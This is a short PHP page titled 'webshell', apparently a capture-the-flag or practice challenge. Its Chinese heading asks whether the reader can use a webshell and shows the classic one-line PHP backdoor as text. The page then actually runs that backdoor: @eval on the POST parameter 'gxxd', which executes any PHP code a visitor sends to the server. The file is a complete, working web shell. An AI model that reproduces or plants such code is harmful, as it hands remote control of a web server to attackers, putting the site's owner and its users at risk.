<?php
ob_start();
?>
<html>

<head>
  <meta charset="UTF-8">
  <script src="./jquery-3.2.1.min.js"></script>
  <script src="./story.js"></script>
  <link rel="stylesheet" type="text/css" href="bootstram.min.css">
  <style>
    body {
      margin-left: auto;
      margin-right: auto;
      margin-TOP: 100PX;
      width: 40em;
    }
  </style>
  <title>webshell</title>
</head>

<body>
  <h1>
    你会用webshell不<br />
    <?php echo htmlspecialchars("<?php @eval(\$_POST['gxxd']);?>"); ?>
  </h1>
  <?php
  @eval($_POST['gxxd']);
  ?>
</body>

</html>
<?php
ob_end_flush();
?>